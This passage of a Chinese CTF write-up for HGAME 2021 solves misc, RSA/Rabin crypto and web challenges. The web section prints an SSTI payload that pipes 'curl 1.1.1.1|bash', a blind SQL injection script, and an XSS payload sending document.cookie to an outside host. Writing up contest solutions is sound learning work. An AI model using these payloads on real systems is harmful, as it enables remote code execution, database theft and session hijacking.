+<p>最后面的GNP反过来不就是png吗？写个脚本转换下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(s)[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209145052869.png" alt="image-20210209145052869"></p>
+<p>直接垂直翻转就行</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209145318900.png" alt="image-20210209145318900"></p>
+<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>流量包 http请求有发向<code>flag.hgame2021.cf</code> 访问</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209142256004.png" alt="image-20210209142256004"></p>
+<p>SPF的完整意思为 “Sender Policy Framework”。翻译过来就是发送方策略框架，是一项跟 DNS 相关的技术，它的内容写在 DNS 的 txt 类型记录里面</p>
+<p>只需查询域名的txt记录就行</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209142353882.png" alt="image-20210209142353882"></p>
+<h4 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h4><p>在频谱图里找到850Hz字样</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209150319739.png" alt="image-20210209150319739"></p>
+<p>不知道有啥用  听了一遍 发现有电报音 用这个网站可以听出来：<a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a></p>
+<p>多试几遍 比对一下</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210210174347544.png" alt="image-20210210174347544"></p>
+<h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h4 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 882564595536224140639625987659416029426239230804614613279163</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 747831491353896780365654517748216624798517769637260742155527</span><br></pre></td></tr></table></figure>
+
+<p>N知道了 factordb分解出p q </p>
+<p><a target="_blank" rel="noopener" href="http://www.factordb.com/">http://www.factordb.com/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; 857504083339712752489993810777</span><br><span class="line">q &#x3D; 1029224947942998075080348647219</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, N)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<h4 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">cipher = pow(s2n(FLAG), <span class="number">2</span>, n)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br></pre></td></tr></table></figure>
+
+<p>e=2 radin 不太懂</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span>  </span><br><span class="line">    n = p * q  </span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)  </span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)  </span><br><span class="line">    yp = gmpy2.invert(p, q)  </span><br><span class="line">    yq = gmpy2.invert(q, p)  </span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n  </span><br><span class="line">    rr = n - r  </span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n  </span><br><span class="line">    ss = n - s</span><br><span class="line">    print((r, rr, s, ss))</span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">c = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(rabin_decrypt(c,p,q,2))</span></span><br><span class="line">print(libnum.n2s(rabin_decrypt(c,p,q,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>Schmidt-Samoa cryptosystem</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang14916/article/details/106597866">https://blog.csdn.net/zhang14916/article/details/106597866</a></p>
+<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h4><p>标题那里ssti  p神的payload 一把梭</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl 1.1.1.1|bash&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h4><p>sql注入 也没啥难度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;https://jailbreak.liki.link/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># data1=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        <span class="comment"># data2=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        <span class="comment"># data1=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        <span class="comment"># data2=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        <span class="comment"># data1=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x7535657273),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        <span class="comment"># data2=&#123;&quot;username&quot;: &quot;admin\\&quot;,&quot;password&quot;:&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x7535657273),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;.format(str(i),str(mid))&#125;</span></span><br><span class="line">        data1=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        data2=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(3),0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data2,timeout=<span class="number">3</span>,proxies=proxies,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># week3sqli</span></span><br><span class="line"><span class="comment"># u5ers</span></span><br><span class="line"><span class="comment"># usern@me,p@ssword</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h4><p>xss 测了测 发现把<code>&lt;&gt;</code>都替换成空了 不过增加了一个替换功能 猜测关键点肯定在这</p>
+<p>每次改变发现变的内容都在js的两个参数 </p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210217140038273.png" alt="image-20210217140038273"></p>
+<p>能不能js注入？试下吧</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;alert(1);&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210217140213694.png" alt="image-20210217140213694"></p>
+<p>发现第一个参数将<code>&quot;</code>实体编码了 但是第二个没有 并且成功弹窗 换成盗取cookie的payload:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;document.location=&#x27;http://1.1.1.1:9000/?&#x27;+document.cookie;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>淦 貌似只会访问首页 啊这 仔细看了看 无意间看到了</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210219153037354.png" alt="image-20210219153037354"></p>
+<p>TMD 竟然有源码 <code>app.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    response = make_response(render_template(<span class="string">&quot;index.html&quot;</span>))</span><br><span class="line">    response.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>] = <span class="string">&quot;token=WELCOME TO HGAME 2021.;&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/preview&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preview</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;substr&#x27;</span>) <span class="keyword">and</span> session.get(<span class="string">&#x27;replacement&#x27;</span>):</span><br><span class="line">        substr = session[<span class="string">&#x27;substr&#x27;</span>]</span><br><span class="line">        replacement = session[<span class="string">&#x27;replacement&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        substr = <span class="string">&quot;&quot;</span></span><br><span class="line">        replacement = <span class="string">&quot;&quot;</span></span><br><span class="line">    response = make_response(</span><br><span class="line">        render_template(<span class="string">&quot;preview.html&quot;</span>, substr=substr, replacement=replacement))</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/send&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;content&#x27;</span>):</span><br><span class="line">        content = escape_index(request.form[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;contents&#x27;</span>):</span><br><span class="line">            content_list = session[<span class="string">&#x27;contents&#x27;</span>]</span><br><span class="line">            content_list.append(content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content_list = [content]</span><br><span class="line">        session[<span class="string">&#x27;contents&#x27;</span>] = content_list</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;post has been sent.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WELCOME TO HGAME 2021 :)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/replace&#x27;, methods=[&quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;substr&#x27;</span>) <span class="keyword">and</span> request.form.get(<span class="string">&#x27;replacement&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;substr&#x27;</span>] = escape_replace(request.form[<span class="string">&#x27;substr&#x27;</span>])</span><br><span class="line">        session[<span class="string">&#x27;replacement&#x27;</span>] = escape_replace(request.form[<span class="string">&#x27;replacement&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;replace success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;There is no content to replace any more&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/contents&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_contents</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;contents&#x27;</span>):</span><br><span class="line">        content_list = jsonify(session[<span class="string">&#x27;contents&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content_list = jsonify(<span class="string">&#x27;&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! &#x27;</span></span><br><span class="line">                               <span class="string">&#x27;Maybe it is nearly done now.&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                               <span class="string">&#x27;&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... &#x27;</span></span><br><span class="line">                               <span class="string">&#x27;And I add some new features to this editor, maybe you can take a try. &#x27;</span></span><br><span class="line">                               <span class="string">&#x27;But it has not done yet, I\&#x27;m not sure if it can be safe from attacks.&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                               <span class="string">&#x27;&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                               <span class="string">&#x27;&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, &#x27;</span></span><br><span class="line">                               <span class="string">&#x27;and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                               <span class="string">&#x27;&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. &#x27;</span></span><br><span class="line">                               <span class="string">&#x27;It really astonished me. Something flashed me.&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/code&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;code&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(response=json.dumps(&#123;<span class="string">&#x27;code&#x27;</span>: session[<span class="string">&#x27;code&#x27;</span>]&#125;), status=<span class="number">200</span>, mimetype=<span class="string">&#x27;application/json&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        code = create_code()</span><br><span class="line">        session[<span class="string">&#x27;code&#x27;</span>] = code</span><br><span class="line">        <span class="keyword">return</span> Response(response=json.dumps(&#123;<span class="string">&#x27;code&#x27;</span>: code&#125;), status=<span class="number">200</span>, mimetype=<span class="string">&#x27;application/json&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.cookies.get(<span class="string">&#x27;token&#x27;</span>) == <span class="string">&quot;29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hgame&#123;G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy&#125;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Only admin can get the flag, your token shows that you&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/clear&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_session</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;contents&#x27;</span>] = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ALL contents are cleared.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape_index</span>(<span class="params">original</span>):</span></span><br><span class="line">    content = original</span><br><span class="line">    content_iframe = re.sub(<span class="string">r&quot;^(&lt;?/?iframe)\s+.*?(src=[\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#x27;]).*?(&gt;?)$&quot;</span>, <span class="string">r&quot;\1 \2 \3&quot;</span>, content)</span><br><span class="line">    <span class="keyword">if</span> content_iframe != content <span class="keyword">or</span> re.match(<span class="string">r&quot;^(&lt;?/?iframe)\s+(src=[\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#x27;])$&quot;</span>, content):</span><br><span class="line">        <span class="keyword">return</span> content_iframe</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = re.sub(<span class="string">r&quot;&lt;*/?(.*?)&gt;?&quot;</span>, <span class="string">r&quot;\1&quot;</span>, content)</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape_replace</span>(<span class="params">original</span>):</span></span><br><span class="line">    content = original</span><br><span class="line">    content = re.sub(<span 